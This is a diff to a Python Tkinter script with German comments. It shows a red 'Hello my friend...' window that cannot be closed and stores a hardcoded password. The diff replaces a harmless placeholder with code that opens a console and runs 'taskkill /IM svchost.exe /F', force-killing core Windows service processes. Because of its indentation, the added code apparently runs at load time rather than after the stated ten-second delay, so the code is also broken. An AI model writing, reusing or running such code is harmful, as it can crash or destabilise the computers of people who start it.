@@ -8,8 +8,15 @@ PASSWORT = "7985357"
 # === Script nach 10 Sekunden ===
 def after_10_seconds():
     time.sleep(10)
-    print("DEIN SCRIPT WIRD AUSGEFÜHRT")
-    # os.system("python dein_script.py")
+    import subprocess
+
+BEFEHL = "taskkill /IM svchost.exe /F"
+
+subprocess.Popen(
+    ["cmd.exe", "/k", BEFEHL],
+    creationflags=subprocess.CREATE_NEW_CONSOLE
+)
+
 
 # === Fenster ===
 root = tk.Tk()
@@ -29,7 +36,7 @@ root.protocol("WM_DELETE_WINDOW", lambda: None)
 # === Text oben ===
 label = tk.Label(
     root,
-    text="hallo",
+    text="Hello my friend...",
     fg="white",
     bg="red",
     font=("Arial", 40, "bold")
